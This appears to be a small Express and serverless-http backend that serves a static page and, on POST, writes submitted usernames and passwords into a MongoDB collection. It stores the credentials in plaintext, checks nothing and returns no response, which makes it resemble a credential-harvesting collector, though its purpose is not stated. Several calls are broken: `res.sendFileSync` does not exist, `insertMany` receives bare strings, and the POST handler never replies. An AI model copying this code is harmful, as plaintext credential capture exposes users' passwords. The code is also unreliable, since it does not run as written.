const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const serverless = require('serverless-http');
const port = 3000;
const router = express.Router();
const { Data } = require('../database/schema/data');
require('../database');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, '../static')));

router.get('/', (req, res) => {
    res.sendFileSync('index.html')
});

router.post('/', async (req, res) => {
    const { username, password } = req.body;
    await Data.insertMany([username, password]);
});

app.use('/', router);

// app.listen(port, () => {
//     console.log(`Live at http://localhost:${port}`);
// });
module.exports.handler = serverless(app);